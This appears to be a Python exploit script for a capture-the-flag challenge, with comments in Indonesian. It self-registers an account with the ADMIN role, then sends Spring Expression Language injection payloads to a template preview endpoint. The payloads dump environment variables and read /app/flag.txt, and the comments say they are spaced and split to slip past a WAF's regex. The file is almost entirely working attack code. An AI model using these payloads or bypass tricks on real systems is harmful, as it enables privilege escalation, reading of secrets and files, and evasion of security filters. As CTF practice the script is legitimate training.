import requests
import random

BASE_URL = "http://chals1.apoorvctf.xyz:7001"
username = f"nata_phantom_{random.randint(1000, 9999)}"

def solve():
    # 1. Setup Admin
    requests.post(f"{BASE_URL}/api/register", json={"username": username, "password": "p", "email": "a@a.com", "role": "ADMIN"})
    token = requests.post(f"{BASE_URL}/api/login", json={"username": username, "password": "p"}).json().get("apiToken")
    headers = {"X-Api-Token": token, "Content-Type": "application/json"}

    payloads = [
        {
            "name": "Env Variable Leak (The Easiest Way)",
            # Membaca seluruh environment variables. Siapa tahu flag-nya ada di sana!
            # Kita gunakan spasi di dalam T(...) untuk mengecoh WAF.
            "tmpl": "${ T ( java.lang.System ) . getenv ( ) }"
        },
        {
            "name": "System Property Leak",
            # Membaca property spesifik yang kita temukan di application.properties
            "tmpl": "${ T ( java.lang.System ) . getProperty ( 'sweetshop.flag.path' ) }"
        },
        {
            "name": "Space-Agnostic ResourceUtils",
            # Menggunakan spasi di antara token untuk merusak pola Regex WAF.
            # Kita panggil getURL tanpa keyword 'new'.
            "tmpl": "${ T ( org.springframework.util.StreamUtils ) . copyToString ( T ( org.springframework.util.ResourceUtils ) . getURL ( 'f' + 'ile:/app/flag.txt' ) . openStream ( ) , 'UTF-8' ) }"
        },
        {
            "name": "The BeanUtils Bypass (No newInstance keyword)",
            # BeanUtils.instantiateClass adalah cara alternatif membuat objek tanpa kata 'newInstance'
            "tmpl": "${ T ( org.springframework.util.StreamUtils ) . copyToString ( T ( org.springframework.beans.BeanUtils ) . instantiateClass ( T ( java.io.FileInputStream ) . getConstructor ( T ( java.lang.String ) ) , '/app/flag.txt' ) , 'UTF-8' ) }"
        }
    ]

    print(f"[*] Menjalankan 'The Phantom' Bypass...")
    for p in payloads:
        print(f"\n[*] Mencoba: {p['name']}")
        try:
            res = requests.post(f"{BASE_URL}/api/admin/preview", headers=headers, json={"template": p['tmpl']})
            if res.status_code == 200:
                data = res.json()
                preview = data.get("preview", "")
                if preview and "error" not in str(preview).lower():
                    print(f"[+] BERHASIL!")
                    print(f"[!] HASIL: {preview}")
                    return
            print(f"[-] Gagal: {res.text}")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    solve()
